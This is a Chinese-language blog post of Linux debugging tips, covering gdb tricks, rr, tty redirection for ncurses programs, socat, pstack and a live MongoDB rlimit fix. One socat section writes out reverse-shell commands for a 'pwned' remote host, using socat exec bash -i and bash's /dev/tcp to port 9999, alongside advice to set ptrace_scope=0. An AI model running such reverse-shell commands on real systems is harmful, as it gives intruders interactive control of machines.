---
layout: post
title: 調試技巧2
author: MaskRay
tags: [debug, c]
---

之前寫過一篇[《Debug Hacks》和調試技巧](/blog/2013-07-25-debug-hacks)。

## `CFLAGS`使用`-g3`

對於重度使用macro的程序很有用，可以在gdb裏使用`info macro NAME`、`macro expand EXPR`等命令了，`print`參數裏的macro也可以展開。

<!-- more -->

## rr

參見<http://rr-project.org/>，調試時最痛苦的莫過於難於重現，rr可以把不確定的外部影響固定下來。它的初衷是用來調Firefox的，由此可見它的可用性……幻燈片<http://rr-project.org/rr.html>介紹了很多內部機理，值得一看。

## `gdb -p`不可用: ptrace: Operation not permitted.

gdb無法attach到用戶相同的另一個進程上。Arch Linux、Ubuntu等很多發行版的內核默認設置了`kernel.yama.ptrace_scope`，參見<https://lwn.net/Articles/393012/>，即不具有`CAP_SYS_PTRACE` capability的進程只能ptrace它的後裔進程(子、孫、玄孫、來孫、晜孫、仍孫、雲孫、耳孫等)。不特別在乎安全性的話，可以執行`sudo sysctl kernel.yama.ptrace_scope=0`。

## 收到SIGINT(或其他信號)後立刻用gdb調試自己

設想是fork產生一個新進程並停下來，原進程exec成`gdb`並attach調試新進程。注意：新進程應設置以創建新的進程組，不然gdb按數次`continue`後自身也會被stop，gdb所在終端將丟失前臺進程組。這裏我不太清楚gdb被stop的具體原因，但進程組經常作爲一個整體和信號、終端等概念相互關聯，可能是這方面的原因。

這裏`SIGINT`可以考慮換成`SIGFPE`、`SIGSEGV`等，以防止進程死亡，用gdb交互式檢視各個變量的值等以便於差錯。

<https://gist.github.com/MaskRay/298e87e465f45988d37f>：

```c
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
void sigint(int)
{
  pid_t pid = fork();
  if (pid == -1)
    abort();
  else if (pid) {
    char s[13];
    sprintf(s, "%d", pid);
    execlp("gdb", "gdb", "-p", s, NULL);
  } else {
    setpgid(0, getpid());
    kill(getpid(), SIGSTOP);
  }
}
 
int main()
{
  signal(SIGINT, sigint);
  sleep(1337);
  puts("seen after gdb");
  sleep(1337);
}
```

## 調試使用終端特性的程序

對於ncurses這類使用終端特性的程序，在gdb下調試時，gdb交互的終端也會被程序使用，程序可能執行屏幕擦除、移動光標等操作，和gdb交互的輸出混雜在一起，產生干擾。解決方案是使用gdb的`tty`命令(文檔見`info '(gdb) Input/Output'`)。下面以`rlwrap rev`爲例說明調試方法。

使用coreutils中的`tty`命令(並非gdb的`tty`命令)獲得當前終端的名稱，如`/dev/pts/13`，然後創建新shell會話，假設終端名是`/dev/pts/14`，將用作被調試程序的標準輸入、輸出、出錯。在這個新終端裏執行`sleep 9999`(如果不執行這條命令的話，`/dev/pts/14`的前臺進程組是shell，會搶奪終端輸入，而`sleep`不會讀取終端輸入，因此不會和被調試程序競爭)。

然後回到原來的shell會話(`/dev/pts/13`)，用gdb調試程序：
```
% gdb -tty /dev/pts/14 --args rlwrap rev
Reading symbols from rlwrap...(no debugging symbols found)...done.
(gdb) r
```

之後即可在`/dev/pts/14`和被調試程序交互了。或者用命令`tty /dev/pts/14`替代命令行選項`-tty`。

注意，此時被調試程序的標準輸入、輸出、出錯均爲`/dev/pts/14`，但沒有控制終端(controlling terminal)，並且能在`/dev/pts/14`看到gdb的警報：`warning: GDB: Failed to set controlling terminal: Operation not permitted`。用`strace`調試`gdb`可以看到`ioctl(3, TIOCSCTTY, 0) = -1 EPERM (Operation not permitted)`，即`gdb`嘗試把`/dev/pts/14`設爲被調試進程的控制進程，但失敗了。因爲`/dev/pts/14`是另外兩個進程的控制終端(shell和`sleep 9999`)，無法搶奪(參看`man tty_ioctl`的`TIOCSCTTY`)。就我所知，與控制終端關聯僅影響前臺進程組的一些特性與信號遞送，不影響終端模式的變更，對於多數程序用不着特定終端成爲控制終端，只需有文件描述符指向終端即可，因此這個錯誤無關緊要。

參見<http://dirac.org/linux/gdb/07-Debugging_Ncurses_Programs.php>。

## socat

把不同輸入輸出端對接的瑞士軍刀，是`nc`的進化型，支持非常多的網絡協議、文件等IO方式。

下面演示如何把一個程序的輸入和輸出分別接到監聽的某個socket的輸出和輸入上。

### 對弈的gnuchess

創建`black.sh`：
```zsh
#!/bin/zsh
{ echo depth 0; cat; echo exit;} | gnuchess -e | stdbuf -o0 grep -aPo '(?<=My move is : )\S+'
```

用`socat`啓動TCP服務端：`socat tcp-l:4444,reuseaddr exec:./black.sh`。

創建`white.sh`：
```zsh
#!/bin/zsh
{ echo depth 0; echo go; cat; echo exit;} | gnuchess -e | tee /tmp/output | stdbuf -o0 grep -aPo '(?<=My move is : )\S+'
```

用`socat`啓動TCP客戶端：`socat tcp:0:4444,reuseaddr exec:./white.sh`。之後即可在`/tmp/output`看到兩個`gnuchess`進程的對局。執行`gnuchess`，輸入`depth 0`後可以限制它的搜索深度(加快運行速度)，輸入`go`可以讓它走一步。

寫到此處，忽然想到之前NOI 2010團體對抗賽時，不瞭解這些東西的用法，浪費了很大工夫。

### 輸入輸出到終端的reverse shell

通常用`system("sh")`等方式搞的shell都不是interactive shell，沒有提示符，也無法用readline的快捷鍵，不方便。下面介紹產生interactive shell的方法：

本地監聽9999端口，等遠端被pwn的程序連接：
```zsh
socat stdio,raw,echo=0 tcp-l:9999
# 或者使用stty -echo raw; nc -l 9999; stty echo -raw
```

遠端執行：
```zsh
socat tcp:0:9999 exec:'bash -i',pty,stderr  # 0應填之前監聽9999端口的機器的IP
```

當然遠端很可能沒有`socat`，可以用util-linux包中的`script`：
```bash
script -qc 'bash -i' /dev/null &>/dev/tcp/0/9999 <&1  # 使用了bash創建socket的功能
```

### pstack

打印指定進程的系統棧。

本質是一段腳本，核心是下面這句話：
```zsh
#!/bin/zsh
gdb -q -nx -p $1 <<< 't a a bt' 2>&- | sed -ne '/^#/p'
```

你應該把它保存到你的工具集裏。新的gdb支持對單線程進程使用`thread apply all bt`了。

```
% pstack $$
#0  0x00007fc00a3a6866 in sigsuspend () from /usr/lib/libc.so.6
#1  0x0000000000471906 in signal_suspend ()
#2  0x0000000000442d56 in ?? ()
#3  0x0000000000443437 in waitjobs ()
#4  0x0000000000429b4b in ?? ()
#5  0x000000000042a6e1 in execlist ()
#6  0x000000000042a970 in execode ()
#7  0x000000000043c1dc in loop ()
#8  0x000000000043f30e in zsh_main ()
#9  0x00007fc00a393800 in __libc_start_main () from /usr/lib/libc.so.6
#10 0x000000000041013e in _start ()
```

## 安裝新的gdb

gdb和gcc有一定的版本適配性，有些惡劣的工作環境需要自己編譯安裝gdb，下面只是我折騰C++ STL查看器的註記。

```zsh
./configure --prefix=~/.local/stow/gdb --with-gdb-datadir=/usr/share/gcc-4.9/python
```

`~/.gdbinit`裏添加：

```
python
import sys
sys.path.append('/usr/share/gcc-4.9/python')
from libstdcxx.v6.printers import register_libstdcxx_printers
register_libstdcxx_printers(None)
end
```

## 沒有源碼的環境調試

用sshfs或其他文件共享手段從其他機器上掛載源碼目錄，使用`directory`命令設置源碼查找目錄。另外還有`set substitute-path`，參見`info '(gdb) Source Path'`。

## MongoDB resource limits動態設置調試記

MongoDB使用mmap映射數據文件及分配內存，把內存管理的任務交給操作系統，造成內存使用量無法控制。我誤以爲resource limits中的`RLIMIT_AS`可以限制虛擬內存使用，
就在啓動`mongod`前執行`ulimit -v $[512*1024]`，效果是之後所有在shell裏啓動的新進程的虛擬內存都不能超過512MiB。

在測試寫入性能時，發現過了很長時間也沒有把所有測試數據插入成功。後查看日誌發現這些記錄：
```
2015-03-13T20:20:18.558+0800 [conn1] ERROR: mmap private failed with out of memory. (64 bit build)
2015-03-13T20:20:18.558+0800 [conn1] Assertion: 13636:file /tmp/db/test.2 open/create failed in createPrivateMap (look in log for more information)
```

大概每5秒鍾會產生一段錯誤記錄，估計和`mmap`有關。使用`strace`查看`mongod`及其所有子進程(包括當前和未來創建的)的`mmap`系統調用：`strace -fe mmap -p $(pgrep -n mongod)`，產生大量重複的輸出：
```
[pid 31551] mmap(NULL, 67108864, PROT_READ|PROT_WRITE, MAP_SHARED, 17, 0) = 0x7f2e58716000
[pid 31551] mmap(NULL, 67108864, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_NORESERVE, 17, 0) = -1 ENOMEM (Cannot allocate memory)
```

即以兩個`mmap`爲單元，不斷輸出這兩行，注意到`mmap(2)`參數中的文件描述符`fd`，再列示已有的文件描述符`ls -l /proc/$(pgrep -n mongod)/fd/`。猜測這兩個`mmap`都和數據文件(`test.0`、`test.1`等)有關。後來再用`pmap -p $(pgrep -n mongod)`列示已映射的地址空間，發現與`0x7f2e58716000`(第一次執行的`mmap`的返回值)地址相近的都是些數據文件，印證了猜測。後來看`/proc`下該進程的相關信息，發現`/proc/$(pgrep -n mongod)/limits`列示的Max address space不正常，終於想到是先前`ulimit -v`限制了地址空間大小，導致了這個問題。之後有兩個解決辦法，一是關閉`mongod`，修改resource limits後重啓，二是動態修改resource limits。爲了好玩，自然選第二個。先要找出`RLIMIT_AS`的數值：`ag RLIMIT_AS /usr/include/bits`，發現是9，之後用`gdb` attach到`mongod`上修改resource limits：

```
$ gdb -p $(pgrep -n mongod)
(gdb) set $r = &{0ll, 0ll}
(gdb) p getrlimit(9,$r)
$1 = 0
(gdb) set (*$r)[0]=-1         # struct rlimit { rlim_t rlim_cur; rlim_t rlim_max; } 要修改的項是rlim_cur
(gdb) p setrlimit(9,$r)
$1 = 0
```

成功修改了resource limits！之後日誌中果然出現了數據文件新建成功的信息，不再有`mmap`的錯誤了。
